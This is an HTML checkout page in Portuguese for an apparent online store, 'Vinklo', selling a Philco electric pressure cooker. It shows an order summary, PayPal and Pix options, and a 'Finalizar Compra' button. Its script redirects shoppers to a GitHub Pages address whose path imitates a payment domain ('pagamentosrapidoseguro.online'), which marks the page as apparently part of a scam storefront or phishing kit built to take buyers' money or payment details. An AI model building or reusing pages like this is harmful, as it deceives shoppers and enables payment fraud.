<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <title>Resumo do Pedido - Vinklo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="description" content="Resumo do seu pedido na Vinklo. Confira os detalhes e finalize sua compra com segurança." />
  <meta name="keywords" content="Vinklo, compras online, panela elétrica, Philco, pagamento, checkout" />
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f3fc;
      margin: 0;
      padding: 0;
      animation: fadeIn 1s ease-in;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    @keyframes pulsar {
      0% { transform: scale(1); box-shadow: 0 0 0 rgba(142,36,170, 0.4); }
      50% { transform: scale(1.05); box-shadow: 0 0 12px rgba(208,92,227, 0.6); }
      100% { transform: scale(1); box-shadow: 0 0 0 rgba(142,36,170, 0.4); }
    }

    .header {
      background-color: #8e24aa;
      color: white;
      padding: 15px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .header .logo-container {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .header img {
      height: 40px;
    }

    .progress-bar {
      display: flex;
      justify-content: center;
      background: #f0d6f7;
      padding: 10px;
    }
    .progress-bar span {
      padding: 8px 16px;
      background: #8e24aa;
      color: white;
      margin: 0 5px;
      border-radius: 20px;
      font-size: 14px;
    }

    .container {
      max-width: 800px;
      margin: 30px auto;
      background: white;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    }

    .label {
      font-weight: bold;
      color: #444;
    }

    .produto-card {
      display: flex;
      flex-direction: row;
      gap: 24px;
      padding: 20px;
      border: 1px solid #ececec;
      border-radius: 12px;
      box-shadow: 0 6px 14px rgba(0, 0, 0, 0.05);
      background-color: #fafafa;
      margin-top: 12px;
    }

    .produto-img img {
      width: 140px;
      border-radius: 12px;
      transition: transform 0.3s ease;
    }
    .produto-img img:hover {
      transform: scale(1.08);
    }

    .produto-info {
      display: flex;
      flex-direction: column;
      justify-content: center;
      gap: 6px;
    }

    .produto-info h3 {
      margin: 0;
      font-size: 18px;
      color: #333;
    }

    .produto-info p {
      margin: 4px 0;
      font-size: 15px;
      color: #555;
    }

    .preco {
      color: #8e24aa;
      font-weight: bold;
    }

    .metodo-pagamento {
      margin-top: 30px;
    }

    .opcoes {
      display: flex;
      gap: 30px;
      align-items: flex-start;
    }

    .opcoes input[type="radio"] {
      display: none;
    }

    .opcoes label {
      cursor: pointer;
      text-align: center;
    }

    .opcoes img {
      height: 50px;
      border: 2px solid transparent;
      border-radius: 8px;
      transition: transform 0.3s ease, border 0.3s ease;
    }

    .opcoes input[type="radio"]:checked + img {
      border: 2px solid #8e24aa;
      transform: scale(1.05);
    }

    .aprovacao {
      font-size: 12px;
      color: #555;
      margin-top: 6px;
    }

    .btn-finalizar {
      background: linear-gradient(135deg, #8e24aa, #d05ce3);
      box-shadow: 0 4px 12px rgba(142,36,170,0.4);
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 30px;
      animation: pulsar 2s infinite ease-in-out;
    }

    .center {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255,255,255,0.9);
      z-index: 9999;
      display: none;
      align-items: center;
      justify-content: center;
      flex-direction: column;
    }

    .loader-bar {
      width: 60%;
      height: 10px;
      background: #eee;
      border-radius: 8px;
      overflow: hidden;
      margin-top: 20px;
    }

    .loader-bar::before {
      content: "";
      display: block;
      height: 100%;
      width: 0;
      background: linear-gradient(90deg, #8e24aa, #d05ce3);
      animation: barAnim 2s linear forwards;
    }

    @keyframes barAnim {
      to { width: 100%; }
    }

    /* Responsivo para celulares */
    @media (max-width: 600px) {
      .container {
        margin: 15px;
        padding: 20px;
      }

      .produto-card {
        flex-direction: column;
        align-items: center;
        text-align: center;
      }

      .produto-img img {
        width: 100px;
      }

      .opcoes {
        flex-direction: column;
        align-items: center;
        gap: 20px;
      }

      .header {
        flex-direction: column;
        align-items: flex-start;
        gap: 10px;
      }

      .progress-bar {
        flex-wrap: wrap;
        text-align: center;
      }

      .progress-bar span {
        margin-bottom: 8px;
      }

      .btn-finalizar {
        width: 100%;
        text-align: center;
      }
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="logo-container">
      <img src="logo_vinklo_completa.png" alt="Logo Vinklo" />
    </div>
    <strong>Caixa</strong>
  </div>

  <div class="progress-bar">
    <span>1. Endereço</span>
    <span style="background:#6a1b9a;">2. Confirmação</span>
    <span style="background:#d1a3e6;">3. Pagamento</span>
  </div>

  <div class="container">
    <h2>Resumo do Pedido</h2>

    <div class="section">
      <p class="label">Produto:</p>
      <div class="produto-card">
        <div class="produto-img">
          <img src="panela.jpg" alt="Panela de Pressão Elétrica Philco" />
        </div>
        <div class="produto-info">
          <h3>Panela de Pressão Elétrica Philco 6L Digital</h3>
          <p><strong>Voltagem:</strong> 110V</p>
          <p><strong>Cor:</strong> Preto</p>
          <p class="preco">Preço: R$189,90</p>

          <div class="metodo-pagamento">
            <p class="label">Método de pagamento:</p>
            <div class="opcoes">
              <label for="pagamento-paypal">
                <input type="radio" id="pagamento-paypal" name="pagamento" checked />
                <img src="pay.PNG" alt="Pagamento com PayPal" />
                <div class="aprovacao">⚠️ Aprovação imediata</div>
              </label>
              <label for="pagamento-pix">
                <input type="radio" id="pagamento-pix" name="pagamento" />
                <img src="pix.PNG" alt="Pagamento via Pix" />
              </label>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="center">
      <button class="btn-finalizar" onclick="finalizarCompra()">Finalizar Compra</button>
    </div>
  </div>

  <div id="overlay">
    <img src="logo_vinklo_completa.png" alt="Carregando..." style="height:60px;" />
    <p style="color:#8e24aa;font-weight:bold;margin-top:10px;">Redirecionando para pagamento...</p>
    <div class="loader-bar"></div>
  </div>

  <script>
    function finalizarCompra() {
      document.getElementById('overlay').style.display = 'flex';
      setTimeout(() => {
        window.location.href = 'https://lojasvinklo.github.io/pay.pagamentosrapidoseguro.online/';
      }, 2000);
    }
  </script>
</body>
</html>
